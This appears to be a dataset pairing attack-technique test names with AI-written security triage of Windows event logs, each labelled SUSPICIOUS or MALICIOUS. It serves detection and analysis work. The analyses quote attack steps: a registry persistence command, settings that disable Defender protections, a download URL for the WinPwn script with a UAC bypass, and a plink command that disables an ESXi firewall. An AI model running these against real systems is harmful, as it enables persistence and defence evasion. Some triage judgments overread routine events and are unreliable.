Disable Windows Prefetch Through Registry,"### Analysis of Provided Windows Event Logs:

Upon analyzing the provided Windows event logs and breaking down the sections for System, Sysmon, Application, and Security logs, here are the standout observations:

1. **System and Security Logs:**
   - There are multiple entries related to time synchronization, specifically involving svchost.exe. These entries (Event ID 4616 in the Security log and Event ID 1 in the System log) are indicative of routine and typical Windows behavior for time synchronization services. While frequent and recursive time changes might be considered abnormal if they happen at very irregular times, the entries here are minimal and do not suggest significant deviations.
   
2. **Sysmon Logs:**
   - The Sysmon logs show a series of process creations including common Windows utilities such as svchost.exe, wevtutil.exe, conhost.exe, hostname.exe, whoami.exe, and cmd.exe. The presence of wevtutil.exe and cmd.exe could potentially be concerning if used in a manner that modifies event logs or system settings respectively (e.g., suspicious Windows registry changes).
   - There is a noteworthy entry where cmd.exe is used to execute a registry modification command to disable the system prefetch (reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters""). While disabling prefetch is not intrinsically malicious, it is unusual and could be used by malicious actors to interfere with system performance monitoring or speed up exploration by a threat actor by manipulating system behaviors.

3. **Risk Assessment:**
   - The execution of `cmd.exe` to modify system settings using `reg.exe` indicates suspicious behavior, potentially representing a system-intelligence-gathering or anti-forensics action. The use of this command without clear justification or documentation is suspicious and warrants further examination.
   - Multiple executions of `wevtutil.exe`, which is used to retrieve event log data or make configurations, might suggest attempts to manipulate or review event logs that could cover tracks in a malicious context.
   - However, the rest of the processes such as `hostname.exe` and `whoami.exe` appear benign, typically part of routine system checks or command-line tasks.

### Final Assessment:

Based on the events observed, particularly the registry modification without clear cause and the repeated use of `wevtutil.exe`, **the overall activity can be classified as:**

- **SUSPICIOUS**. 

Additional investigation is required to determine the intent and contextual factors surrounding the changes made through `cmd.exe` and the potential modifications in monitoring via `wevtutil.exe`. It is recommended to verify the legitimacy of these actions with any associated change requests or operator actions on the CEO's machine and to check for other indicators of compromise or persistence mechanisms in place.

### Recommended Actions:
1. **Verification**: Cross-reference the use of `cmd.exe` and registry changes with any scheduled maintenance or documented administrator actions.
2. **Review Privileges**: Check account `SERVER002\\admin_test` for unusual activity or permission changes, considering it was used for several process actions.
3. **Further Monitoring**: Increase monitoring on the CEO's machine for subsequent unusual activities, especially related to registry changes or log manipulations.
4. **Audit Logs**: Conduct a thorough audit of event logs to identify any further unnoticed patterns or anomalies that match known indicators of compromise."
Rundll32 syssetup.dll Execution,"In the analysis of the provided Sysmon logs, several observations can be made that suggest potential suspicious activity. Key observations include:

1. **Frequent Execution of System Processes:**
   - Multiple instances of `powershell.exe`, `conhost.exe`, `wevtutil.exe`, and `rundll32.exe` are executed by the user `SERVER002\admin_test`. Frequent and repetitive execution of these processes can indicate scripting or automation, which might be legitimate. However, in a different context, it could also suggest attempts to execute or hide malicious activity.

2. **Execution of Rundll32.exe:**
   - The command line involving `rundll32.exe` paired with `syssetup.dll, SetupInfObjectInstallAction DefaultInstall` potentially indicates an attempt to execute a DLL file, which could be benign or could hint at DLL hijacking or misuse for malicious purposes. The execution is related to a `.inf` file stored in a temporary location which is atypical for standard operations.

3. **Wevtutil.exe Usage:**
   - The use of `wevtutil.exe` suggests possible manipulation or clearing of Windows event logs. While `wevtutil` is a legitimate utility for managing Windows Event Logs, its use could be indicative of an adversary attempting to cover their tracks by clearing logs.

4. **Tools for Enumeration:**
   - Execution of `whoami.exe`, `cmd.exe`, and `hostname.exe` indicates actions commonly used in system enumeration. These could be standard operations for system checks but, in conjunction with other suspicious activity, might indicate post-compromise actions.

5. **High Integrity Level Processes:**
   - Several processes are initiated with a high integrity level, suggesting they have administrative privileges. The account `SERVER002\admin_test` executing high-integrity processes could imply that this account has administrative rights, emphasizing the need for verifying whether such actions should be expected from this account.

### Assessment:

Based on the above observations, the behavior appears to correlate with potential post-exploitation activities:

- The combination of command-line usage of `powershell.exe`, `rundll32.exe`, and `wevtutil.exe` with batch processing commands involving temporary paths is suggestive of suspicious activity.
- High-frequency initiation of particular system binaries is not typical for regular user activity, especially by an administratively privileged account, outside regular server processes.
  
### Resolution: **SUSPICIOUS**

The logs contain activity that doesn't look right and warrant further investigation. The nature of the operations, the use of administrative tools, and the execution environment raise concerns that could indicate unauthorized or malicious use of the CEO's machine:

### Recommendations for Further Action:
1. **Verify User Intent:**
   - Confirm whether the actions performed by the `SERVER002\admin_test` account were intentional and authorized by the user.

2. **Endpoint Defender Analysis:**
   - Use Endpoint Detection and Response (EDR) tools to review any additional alerts or behaviors associated with the processes and account involved.

3. **Check for Abnormal Files:**
   - Investigate file creation/modification in the directories mentioned, especially temporary paths, to identify any rogue assemblies, scripts, or executables.

4. **Monitor Network Traffic:**
   - Analyze network logs to identify any outbound connections or communications that align with these activities possibly hinting at data exfiltration or command-and-control traffic.

5. **Strengthen Access Controls:**
   - Limit the use of high-integrity-level access for regular operations and ensure correct policies enforce the necessary least privilege principle. Review and if applicable, isolate the CEO's machine until a comprehensive assessment confirms its security integrity."
Modify UseTPMKeyPIN Registry entry,"The analysis of the provided Windows event logs reveals the following notable observations:

### Key Observations
1. **Time Anomalies**
   - Security logs and system logs show time discrepancies where the system time was adjusted backward. Time anomalies can be indicative of attempts to disrupt log timelines, potentially to evade detections.

2. **Process Executions**
   - Frequent `svchost.exe` executions are noted, which is normal on a Windows system. However, it's crucial to ensure these instances are properly signed and associated with legitimate services.
   - The execution of `wevtutil.exe` (Windows Event Command Line Utility) by the user `SERVER002\admin_test` is noted. This tool is commonly used for managing event logs, which could imply potential log tampering.
   - Execution of `cmd.exe` with a command to add a registry key related to BitLocker (`UseTPMKeyPIN`) seems unusual. This could imply unauthorized configuration or privilege escalation attempts.
   - Use of `whoami.exe` by `SERVER002\admin_test` suggests an action to determine user context, which can be part of a reconnaissance phase in an attack.
   - Numerous `MicrosoftEdgeUpdate.exe` processes running under `NT AUTHORITY\SYSTEM`, shown in Sysmon logs, appear benign as they align with system or application updates.

3. **Integrity Levels and Privileges**
   - A series of processes, such as `cmd.exe` and `whoami.exe`, are running at High integrity levels. This suggests administrative privileges are being used extensively, which in an unusual context could pose a risk.

### Assessment
- **Time Adjustments:** The adjustments and short intervals between time changes in the security logs raise a red flag as they can be used to cover tracks.
- **Registry Manipulation:** Using `cmd.exe` to manipulate registry keys for system policies represents an attempt to alter system behavior without explicit administrative intent visible.
- **Utility Usage:** The use of `wevtutil.exe`, although can be used in routine administrative tasks, alongside the registry changes, could imply attempts to circumvent detection.

### Recommendations
- **Cross-Validation:** Verify if recent updates or administrative actions justifies the observed process execution and registry changes.
- **Security Auditing:** Conduct a thorough audit of accounts with high privileges, especially `SERVER002\admin_test`, for unauthorized access or unusual activity.
- **Anomaly Detection:** Look for further indications of potential lateral movement or compromise, such as unusual network connections or repeated authentication failures.

### Resolution
Given the observations, these logs warrant further investigation to determine intent and context:

**Resolution: SUSPICIOUS**

The presence of these activities in the logs signifies potential risk, and further analysis is needed to determine whether these actions are part of a legitimate administrative task or indicative of a potential compromise."
MSBuild Bypass Using Inline Tasks (VB),"Upon analyzing the provided Windows event logs for the host in question, the following observations and conclusions were made:

### Observations:

1. **Process Execution Patterns**:
   - Multiple instances of `powershell.exe`, `wevtutil.exe`, and `cmd.exe` were executed under the user `SERVER002\admin_test`. The presence of these processes in a security context should be scrutinized especially when executed by an admin level user.
   - Noteworthy is the execution of `msbuild.exe` from the path `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\vb.xml`, which appears to be used for compiling code located in a temp directory. This behavior could potentially indicate a code execution or file-less malware activity. 

2. **Command-line Arguments**:
   - The execution of `msbuild.exe` with a constructed command line may imply a suspicious behavior, typically involved in file transformation or execution of suspicious scripts.
   - Subsequent executions of `vbc.exe` (Visual Basic Command Line Compiler) and `cvtres.exe` hint towards compilation activity likely initiated from the `msbuild.exe` invocation.

3. **Potential Unauthorized Activity**:
   - The presence of processes like `whoami.exe`, `cmd.exe` and `powershell.exe` might suggest a reconnaissance phase, indicating possible malicious intentions.
   - The command-line usage with a high integrity level signifies admin-level access which, if unauthorized, could be part of a privilege escalation attempt or lateral movement activity.

4. **Network and System Monitoring Tools**:
   - There are events of Microsoft Edge Update services executing regularly. This is typical system behavior, although an anomalous frequency or incorrect execution paths might suggest tampering.

### Anomalous Behavior:

- The sequence of process executions from an admin user, including MSBuild in conjunction with temporary directories, combined with command-line recompilation utilities, suggests potential malware activity where code is dynamically introduced or modified.
- The presence of high integrity `conhost.exe` processes linked with command-line activities like starting services could indicate suspicious supervision or control over system operations.
  
### Assessment:

From the analyzed logs, the execution of scripts and compilation processes from temporary directories, particularly involving `msbuild.exe`, may indicate a compromise attempting to utilize these utilities for malicious intent—likely malware deployment or lateral movement preparation.

### Resolution:

Based on the identified indicators of potential compromise, the resolution is:

- **SUSPICIOUS** - This is because while the activities do not definitively confirm an overtly malicious action, they do deviate from typical benign operations and merit further investigation to confirm or rule out malicious activity.

### Recommended Actions:

1. **Immediate Investigation**:
   - Conduct a deeper forensic analysis on the specified user account activities (`admin_test`) and related process executions.
   - Examine any payloads generated or files accessed within the `Temp` directories tied to these operations for potential malicious content.
   
2. **Host Isolation**:
   - Consider isolating the mentioned host (Server002) for a thorough inspection to minimize potential risk spread if the activity is part of a larger campaign.

3. **Review and Tighten Security Policies**:
   - Implement and ensure strict monitoring and limitations on command-line utilities and scripting engines like PowerShell and MSBuild, especially for non-standard user accounts.
   - Bolster endpoint detection response (EDR) rules to alert and log similar activities for faster recognition in the future. 

This level of preventive action and investigative follow-up will either confirm the initial suspicion or provide clarity and safety assurances regarding the current operational security posture of the affected systems."
Disable Windows Shutdown Button,"**Analysis of Logs:**

1. **Time Discrepancies:**
   - There is a notable series of time change events. Specifically, Event ID 4616 in the security log and Event ID 1 in the system log both show alterations to the system time. These changes were processed by `svchost.exe`, a legitimate Windows process, but one commonly used by malicious actors to hide activities by altering timestamps.

2. **Privileged Logon:**
   - Event ID 4672 in the security log indicates a logon event by the user ""admin_test"" with several high privileges, such as ""SeDebugPrivilege"" and ""SeTakeOwnershipPrivilege"". While this could be legitimate, such privileges are substantial and should be scrutinized, as they can be used maliciously to subvert system defenses.

3. **Process Execution in Sysmon Logs:**
   - The Sysmon log shows execution of several command-line utilities by ""admin_test"". These include:
     - `wevtutil.exe` and `conhost.exe`: Standard utilities, but when executed in close succession, it might suggest log clearing or other manipulations.
     - `whoami.exe` and `hostname.exe`: Typically used to gather environment information, but in rapid succession they could be indicative of reconnaissance activities. 
     - `cmd.exe` with suspicious command-line parameters: Altering registry settings without logon (`shutdownwithoutlogon`) is a potential indicator of attempting to change system settings for ulterior motives.

4. **Network-Induced Logon Events:**
   - Event ID 4624 indicates a network logon (type 3) for the ""admin_test"" user, sourced from a workstation named ""DESKTOP-3HL5B2P"". It used NTLM authentication over a seemingly local network IPv6 address (`fe80::a8e:bf59:101d:d65d`). Such a logon might be typical but coupled with the high privileges and system changes, it can point to a lateral movement in the network or unauthorized access.

5. **Registry Modification:**
   - Sysmon logs show `reg.exe` being used under the context of `admin_test` to modify registry settings for system policies. This activity, which is performed with admin privileges, could have been for legitimate system configuration but might also have implications for persistence or other system control mechanisms.

**Assessment and Resolution:**
- The collected logs show a combination of potentially benign system activities, like time synchronization and service calls, and suspicious activities involving high privilege usage, system time manipulations, and rapid-fire execution of system utilities that suggest reconnaissance or aggressive system manipulation attempts.
- Given the time change events, use of high-privilege accounts, particularly ""admin_test"", and registry modifications, these suggest the logs potentially indicate undesirable activity or attempts to hide the true sequence of events and system changes.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
1. **Extended Investigation:**
   - Conduct a thorough investigation on user ""admin_test"" activities to determine if the privileged actions were authorized or part of unusual behavior.
   - Check if there are previous logs or other reporting that could corroborate the rapid succession of system utility execution, focusing on command execution patterns.

2. **Audit and Monitoring:**
   - Implement more stringent monitoring on users with high privileges, particularly those executing potentially anomalous commands.
   - Use EDR solutions to track potential lateral movement and other activities across the network.

3. **Systems Checks:**
   - Verify integrity of the system settings, especially those related to network access and auditing configurations.
   - Assess if there are unauthorized changes to security policies or registry settings that could expose the system to additional threats.

4. **Network Security Measures:**
   - Examine network flows and authenticate traffic logs for unusual IP connections, matching known bad signatures that could identify potential intrusions or data exfiltration attempts."
Enable Proxy Settings,"**Detailed Analysis:**

1. **Windows PowerShell Log**: 
   - This segment is empty, suggesting there are no logged PowerShell activities. Often, a lack of logs can be as concerning as overwritten or manipulated ones when investigating. However, its absence alone is not indicative of malicious activity.

2. **Security Log Events (Event ID 4616)**:
   - The events indicate time changes. The presence of several time changes in succession might suggest an attempt to obscure log activities or manipulate timestamps. This can sometimes be a technique used in evasion or covering tracks. The `svchost.exe` process—a legitimate Windows process—was used to execute these changes while running under `NT AUTHORITY\LOCAL SERVICE`.

3. **Application Log**:
   - Displays typical logging behavior for the Software Protection Platform Service. This specific log doesn't indicate suspicious activity.

4. **System Log**:
   - Similar to the security logs, there are entries marking time changes associated with `svchost.exe`. This corroborates with the actions seen in the security log and results from behavior potentially consistent with timezone adjustments rather than a common evasion technique.

5. **Sysmon Logs**:
   - There is an unusual sequence of process executions:
     - Multiple usages of `wevtutil.exe`, often used to query event logs, and `conhost.exe` tied to administrative activities by the `admin_test` user.
     - Notable command execution: A command line involving `cmd.exe` performs a registry modification to the proxy settings which seems out of context and could suggest a possible persistence mechanism or an intention to reroute traffic. This occurrence is particularly suspicious as it executes a significant configuration change.
     - Execution of `whoami.exe` and network configuration changes could suggest information gathering and network settings modification activities. 
   - The use of `reg.exe` to alter internet settings for proxy enablement can be deliberate and aligns with typical post-exploitation or configuration activities indicating an attempt to ensure an attacker retains network access or redirects traffic through a proxy.

**Assessment:**

The logs present a mixture of events. While `svchost.exe` and registry changes might initially seem innocuous since these and other executables (e.g., `wevtutil.exe`, `cmd.exe`) are native to Windows, the context and sequence suggest more than routine system administration. Registry modification to the proxy settings and chain of processes like `whoami.exe` indicate behavior that requires detailed examination.

**Threats or Risks Identified:**

- Time manipulation via `svchost.exe`.
- Querying of event logs using `wevtutil.exe` indicating potential log analysis or clearing activity.
- Registry changes to proxy settings, likely indicative of network configuration manipulation.

**Guidance on How to Proceed:**

- Conduct a forensic analysis to confirm if these registry changes and process executions were authorized and legitimate.
- Review previous administrative activities by the `admin_test` user for anomalous behavior.
- Investigate network traffic patterns to check for unauthorized access especially due to proxy setting changes.
- Analyze additional related logs (PowerShell) and network traffic from around this time for further suspicious activities.
- Consider instigating a full security audit on the usage of `svchost.exe` and registry alterations on the CEO's machine to preclude compromise.

**Resolution:** SUSPICIOUS

The activities observed are not immediately recognizable as malicious but are sufficiently irregular to warrant closer scrutiny and further investigation to ensure there's no underlying compromise or security breach."
WinPwn - UAC Magic,"Based on my review of the provided Windows event logs, there are multiple indicators of potentially malicious activity. Here is a detailed analysis:

### Windows PowerShell Log Analysis:
- **PowerShell Script Execution**: The logs show a PowerShell script being executed that downloads a script from GitHub. The URL used is `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`. This script is hosted on a public repository which is a common tactic used by attackers to deliver malicious payloads.
- **UAC Bypass Attempt**: The script includes a command to perform a UAC (User Account Control) bypass using the technique 'magic', which indicates an attempt to escalate privileges. This is considered an advanced attack technique and strongly suggests malicious intent.

### Security Log Analysis:
- **Privilege Escalation**: The security log includes Event ID 4672, which indicates special privileges were assigned to a new logon. These privileges include `SeDebugPrivilege` among others, which are typically indicative of administrative rights. The user `admin_test` received these privileges, which could align with the PowerShell script's attempt to perform UAC bypass.

### Sysmon Log Analysis:
- **Process Creation and Execution**: The Sysmon logs confirm the execution of the PowerShell script and the subsequent processes it spawned. The same user, `admin_test`, is observed initiating several command-line executions through `wevtutil.exe`, `conhost.exe`, and use of PowerShell which aligns with typical post-exploitation behavior. The execution details match the PowerShell commands logged earlier.

### Final Assessment:
The combination of downloading and executing scripts from a potentially malicious source, attempting UAC bypass for privilege escalation, and executing further PowerShell processes are strong indicators of a security breach.

### Resolution:
- **MALICIOUS**: The logs clearly show signs of malicious activity and potential compromise of the system. Immediate actions are recommended to contain and remediate the threat.

### Recommended Actions:
1. **Isolate the affected machine** (Server002) from the network to prevent further compromise.
2. **Conduct a thorough forensic investigation** of the machine to identify any additional indicators of compromise and establish the full extent of the breach.
3. **Reset credentials** for any affected user accounts, particularly the `admin_test` account, and review all user account privileges.
4. **Deploy updated security patches and EDR updates** to close any vulnerabilities that may have been exploited.
5. Review and enhance **network and endpoint monitoring** to detect and prevent similar attempts in the future.

By taking these steps, we aim to mitigate the immediate risk and strengthen the security posture against future threats."
Delete TeamViewer Log Files,"### Detailed Analysis of the Windows Event Logs

#### Windows PowerShell Logs
- **Event IDs**: 1043 to 1050
  - **Command Executed**: The command executed via PowerShell is `powershell.exe & {New-Item -Path $env:TEMP\\TeamViewer_54.log -Force | Out-Null, Remove-Item $env:TEMP\\TeamViewer_54.log -Force -ErrorAction Ignore}`. 
  - **Analysis**: This command sequence is attempting to create and then remove a log file in the temporary directory. This behavior could be benign, especially if it is part of a cleanup script. However, it could also be used to execute transient changes that evade detection by standard logging or auditing processes. The use of the `TeamViewer` name is interesting but not immediately indicative of malicious activity without further context on installation or usage of TeamViewer on the CEO’s machine.

#### System Logs
- **Time Synchronized Events**: Several events outline synchronization and update of time, executed by the svchost.exe process, which is typical for time service adjustments.
  - **Analysis**: These events appear to be normal activities related to system clock synchronization and do not inherently indicate malicious behavior.

#### Security Logs
- **Event ID 4616**: Time change logged. 
  - **Analysis**: These logs show normal operation for a LOCAL SERVICE account. Time changes may be significant if not authorized, but here they align with system activities and do not appear immediately suspicious.

#### Application Logs
- **Event IDs**: 2383 to 2385
  - **Edge Update Related Events**: Indicate periodic check-ins or application updates for Microsoft Edge.
  - **Analysis**: These are typical for automated software updates and do not immediately harness indicators of threat.

#### Sysmon Logs
- **Various Event IDs**: Logging executions of several system processes (wevtutil, whoami, svchost) initiated by `SERVER002\admin_test` user and SYSTEM account.
  - Notably, processes like `whoami.exe` are used for retrieving account information and are generally benign, but their execution should still not be frequent without cause.
  - Frequent execution or invocation of interpreters or utility tools like `conhost.exe` and `wevtutil.exe` may trigger alerts but are not inherently malicious.
  - **Microsoft Edge Update**: Numerous entries regarding `MicrosoftEdgeUpdate.exe` in various stages of execution reflecting a normal update process.

### Assessment
The events provided reflect system maintenance tasks such as the update of applications, synchronization of system time, and sporadic system information retrieval. The PowerShell command used could imply a benign software testing or logging cleanup activity; however, the transient creation and deletion in such a manner warrant a deeper look to ensure it was initiated and controlled appropriately, especially considering the potential implication of leveraging or misappropriating TeamViewer.

### Potential Threats or Risks
- The usage of PowerShell with non-interactive scripts that create and delete files can be flagged for review, but given the system-wide operations observed, malicious intentions are not emphatically evident.

### Guidance on How to Proceed
- **Further Investigation Required**: 
  - Examine access logs or remote session initiation related to `TeamViewer` to confirm legitimate usage.
  - Verify the script's origin and its typical use case in the organization.
  - Consider additional monitoring for anomalies in PowerShell script execution or network activity that could denote data exfiltration or privilege escalation.

### Resolution
**SUSPICIOUS**: Logs contain activity (specifically the PowerShell behavior) that needs more investigation to rule out unintended actions or ensure proper authorization of processes aligned with executive systems."
Abusing MyComputer Disk Backup Path for Persistence,"### Detailed Analysis of the Logs:

**1. Indicators of Potentially Malicious Activity:**

- **Registry Modification via CMD**: 
  - There is a command-line execution log where `cmd.exe` was used to modify a registry key related to `Explorer\MyComputer\BackupPath` with the command: `""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath"" /t REG_EXPAND_SZ /d ""%systemroot%\system32\notepad.exe"" /f`.
  - This kind of registry modification could be indicative of a Persistence Mechanism, where an attacker might be trying to ensure execution of `notepad.exe` in a specific context.

- **Frequent Usage of `wevtutil.exe`**: 
  - `wevtutil.exe` was executed multiple times in quick succession by the user `SERVER002\admin_test`. While `wevtutil.exe` is a legitimate tool used to manage event logs, repeated or unusual executions can be a sign of evasion techniques being implemented to manipulate or cleanse event logs.

- **Presence of High-Integrity Processes**: 
  - Multiple processes were run at High Integrity Level by `SERVER002\admin_test`, which raises questions about the intentions of these executions, especially the use of command-line interfaces for registry modifications (`cmd.exe`).

- **Time Manipulation Detected**:
  - There are logs indicating that the system time was adjusted, as seen in Event IDs 4616 in the Security log. The altering of system time can sometimes be used to evade time-based security mechanisms.

- **Tool Usage like `whoami.exe` and `hostname.exe`**:
  - The usage of `whoami.exe` and `hostname.exe` could signal reconnaissance activities, potentially used by attackers to gather information about the compromised system's user and network configuration.

- **Launch of Multiple System Processes from wsmprovhost.exe**:
  - This process, typically used for Windows Remote Management, acting as a parent to `cmd.exe`, `whoami.exe`, and `hostname.exe`, could indicate that commands are being executed remotely.

**2. Benign Activities Noted:**

- **Microsoft Edge Update Processes**:
  - Several executions related to `MicrosoftEdgeUpdate.exe` and associated components appear to be standard update processes. These activities are likely normal system or application updates and don't immediately seem to relate to the suspicious activities noted elsewhere.

### Threat Assessment:

- Based on the analysis of the log entries provided, there are significant signs of suspicious behavior, particularly related to potential persistence mechanisms and evasion tactics being deployed on `Server002` by a user with admin privileges.
- The registry modification via `cmd.exe` and the system time manipulation both point towards actions that require further investigation, as they could potentially be part of a larger malicious operation.

### Guidance on How to Proceed:

- **Investigate User Activities**: Conduct a more detailed investigation into the activities of `SERVER002\admin_test`, reviewing any scripts or applications that might have been executed.
  
- **Examine Registry Changes**: Validate the purpose of the registry changes, and cross-check with any scheduled tasks or startup configurations that may have been impacted.

- **Time Sync Verification**: Ensure that the system's time service is configured correctly and investigate the reason for the time changes.

- **Review Remote Management Usage**: Analyze the usage of `wsmprovhost.exe` and whether remote commands are being leveraged maliciously.

- **Improve EDR Configuration**: Enhance endpoint detection and response (EDR) capabilities to better flag such registry changes and time adjustments in real-time.

### Conclusion:

**Resolution**: **SUSPICIOUS**

The logs have been marked as containing ""SUSPICIOUS"" activity, as the behavior does not appear to be part of typical system functions and warrants further investigation to rule out potential compromise."
Delete Microsoft Defender ASR Rules - GPO,"The analysis of the provided Windows event logs involves examining each log for signs of unusual or suspicious activity. Here's a detailed breakdown of what is noted from the logs:

1. **Security Logs:**
   - No relevant events or anomalies were observed in the security logs. The logs mainly contain Time Change events, which are usually benign and related to system time synchronization.

2. **System Logs:**
   - The Kernel and Time Service logs represent activities tied to system time adjustments, which can be legitimate maintenance activities. No immediate signs of suspicious behavior are noted in these entries.

3. **Application Logs:**
   - These logs do not contain any immediately suspicious activities. The logs note typical operations such as the Software Protection service starting.

4. **Sysmon Logs:**
   - A pattern involving `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` being executed multiple times by a user (`SERVER002\\admin_test`) was observed. 
   - The execution of `WHOAMI.EXE`, `HOSTNAME.EXE`, and the notable use of PowerShell commands to manipulate registry keys related to Windows Defender:
     - The PowerShell command specifically alters registry settings under `HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules`. The PowerShell script creates, alters, and then removes a registry item (`36190899-1602-49e8-8b27-eb1d0a1ce869`), a process that is quite unusual and could potentially be indicative of an attempt to manipulate security settings.
     - The manipulation of registry keys using PowerShell, especially concerning Windows Defender, is commonly seen in malicious activities aimed at defeating security measures.
   
5. **PowerShell Logs:**
   - The PowerShell logs detail the script execution that involves the creation and deletion of registry entries. This action seems suspicious as it might indicate an attempt to bypass or modify security configurations, although it reverses its changes.

In conclusion, while some elements might initially appear benign, the use of PowerShell to modify and interact with security settings via registry manipulations is highly suspicious, especially when not clearly authorized or documented as a safe operation (especially on a high-profile endpoint such as the CEO's machine).

### Assessment:
- **Resolution**: SUSPICIOUS

### Guidance on Proceeding:
- Conduct a thorough review of user activities, particularly those of `SERVER002\\admin_test`, to ascertain the legitimacy of these actions.
- Correlate the timestamp and process information with other logs, potentially including network traffic, to understand the context of these registry changes.
- Evaluate system policy and last changes to the Windows Defender settings for unauthorized modifications.
- Implement further threat-hunting measures to identify any lateral movement or persistence mechanisms.
- Engage with the respective user/administrative personnel to confirm whether the observed activities align with their legitimate operational use case."
Tamper with Windows Defender Registry - Powershell,"### Analysis of Windows Event Logs

#### Summary:
The provided logs include Application, Windows PowerShell, Sysmon, System, and Security logs. The suspicion primarily arises from entries in the Windows PowerShell and Sysmon logs due to the disabling of Windows Defender settings and the execution of a PowerShell script with a potentially malicious payload. Here's a detailed breakdown:

#### 1. **Windows PowerShell Log Analysis:**
- **Event Entries (ID: 1043 - 1050)**: The PowerShell logs show a command executed with `powershell.exe` that disables multiple protective features of Windows Defender. The following settings were altered:
  - `DisableAntiSpyware`
  - `DisableAntiVirus`
  - `DisableBehaviorMonitoring`
  - `DisableRealtimeMonitoring`
  - and several other settings disallowing real-time protection and tamper protection.

This behavior is highly suspicious because these changes effectively cripple the machine’s defenses against malware, making it vulnerable to further attacks. Such changes are a common tactic used by malware to avoid detection.

#### 2. **Sysmon Log Analysis:**
- **Processes Executed**: 
  - Noticeable repetition in execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test` without explicit command lines that indicate logging or retrieval process details, possibly used in conjunction with the PowerShell script to manipulate logs (IDs: 17954, 17955, etc.).
  - **PowerShell Process (ID: 17980)**: The specific command in this process confirms the script's execution to disable Defender features as noted in the PowerShell logs.
- **Edge Update Processes**: The frequent Edge Update related processes (MicrosoftEdgeUpdate.exe) might suggest either regular auto-update actions or potential Trojan processes strung with legitimate files to disguise malicious activity. However, without deviating from expected command lines or paths, they are not suspicious by themselves here.

#### 3. **Application Log Analysis:**
- The 'Service stopped' logs from the `edgeupdate` provider seem routine and don't immediately point to malicious activity (EventRecordID: 2384, 2385). However, if correlated with unauthorized changes, further investigation might be warranted.

#### 4. **System and Security Logs:**
- Time set back events (EventID 4616 in Security logs) are generally indicative of potential time manipulation which is often part of stealth tactics used by attackers, but require corroborative evidence to be reckoned as malicious in isolation.

### Assessment and Resolution:

**Resolution**: **MALICIOUS**

- **Reasoning**: The PowerShell command line explicitly disables key Windows Defender protections which is a clear indicator of malicious activity. Such actions are typically associated with malware attempting to disable security measures to persist without detection. This, combined with process executions observed in the Sysmon logs, supports this conclusion.
- **Immediate Recommendations**:
  - **Isolation**: Immediately isolate the affected system to prevent further network propagation.
  - **Investigation**: Conduct a full forensic analysis of the system to identify any further compromise or malware present.
  - **Remediation**: Restore the Windows Defender settings either manually or using company-wide scripts/policies and consider reimaging the system if appropriate.
  - **Monitoring**: Increase monitoring on other systems for similar behavior or attacks, focusing primarily on the use of PowerShell with similar command patterns."
ESXi - Disable Firewall via Esxcli,"Upon reviewing the provided Windows event logs, several log entries suggest potentially suspicious activity on the CEO's machine. Here's a detailed analysis of the findings:

### Analysis of Logs:

#### Sysmon Logs:

1. **PowerShell Execution**:
   - The first log entry shows the execution of `powershell.exe` by the user `SERVER002\admin_test`. While PowerShell usage can be normal, it is often employed by attackers for executing malicious scripts. However, since no specific command-line arguments or script paths are provided, the intent is unclear.

2. **Process Activity**:
   - There are multiple entries involving the use of `wevtutil.exe` and `conhost.exe`. `wevtutil.exe` is a command-line utility to manage Windows Event Logs, and its frequent execution could indicate an attempt to tamper with or clear logs to cover tracks. The frequent pattern of execution, especially by a non-system-level user, could indicate misuse.
   - `conhost.exe` seems to be consistently running alongside other processes, which in and of itself is typical as it is linked with command-line operations.

3. **Execution of `cmd.exe` and `plink.exe`**:
   - The execution of `cmd.exe` with command-line arguments invoking `plink.exe` is highly suspicious. `Plink.exe` is a command-line tool from the PuTTY suite for establishing SSH connections. The command appears to execute a script (`esxi_disable_firewall.txt`) on a remote server, ""file.local"", which might indicate an attempt to disable a firewall on an external system using SSH.
   - The use of `-pw n/a` could imply potential misuse or attempt to bypass security by not supplying or obfuscating the password during the SSH session.

4. **Use of `whoami.exe` and `hostname.exe`**:
   - These utilities, when run in quick succession, could be used for reconnaissance, gathering information about the user context and system name.

5. **Edge Update Activity**:
   - Several entries involve Microsoft Edge Update processes (e.g., `MicrosoftEdgeUpdate.exe`). While these appear normal at first glance, it generated a significant number of processes and command-line executions. This could indicate an update or installation process. However, given the other suspicious activities, it might require further confirmation to ensure it's legitimate.

### Assessment:

- **Suspicious Activity**: The logs suggest a potential misuse involving `plink.exe`, possibly attempting to connect and execute a script on a remote system. Frequent process executions like `wevtutil.exe` and `conhost.exe` could suggest log tampering. Use of `cmd.exe` with unusual parameters and utility executions for gathering system info could indicate malicious reconnaissance activities.

### Recommendations:

1. **Further Investigation**: The activities related to `plink.exe` and `wevtutil.exe` should be investigated further. Check for any unauthorized scripts or tools on the system. Identify any unusual outgoing SSH connections, and trace activities tied to the user account `SERVER002\admin_test`.

2. **Review Authorizations and Permissions**: Review the permissions and access levels of the user `admin_test`. Ensure that sensitive operations like log management and remote scripting are protected and monitored.

3. **Monitoring and Alerts Setup**: Enhance monitoring of PowerShell, `cmd.exe`, and other binaries that may perform sensitive operations. Set up alerts for specific events, such as unauthorized access attempts or abnormal log clearing activities.

4. **Isolate and Audit**: If any malicious intent is confirmed, isolate the affected system(s) immediately and perform a comprehensive audit to identify any further compromise.

### Resolution:

Based on the analysis, the resolution is marked as **SUSPICIOUS**. The activities noted require further investigation to rule out or confirm malicious intent."
Msiexec.exe - Execute Local MSI file with an embedded EXE,"Based on the provided log entries from the Windows event logs, I have conducted an analysis to identify any indicators of suspicious or malicious activity. Here's a detailed breakdown:

1. **Powershell Execution**:
   - The logs show `powershell.exe` executed by `SERVER002\admin_test`. Powershell usage is not inherently malicious, but it is often leveraged by attackers for script execution or payload delivery.
   
2. **Use of `wevtutil.exe` and `whoami.exe`**:
   - `wevtutil.exe` is being repeatedly executed by the user `SERVER002\\admin_test`. This tool manages Windows Event Logs and could potentially be used to tamper with log entries—a potential indicator of malicious intent if the context is abnormal.
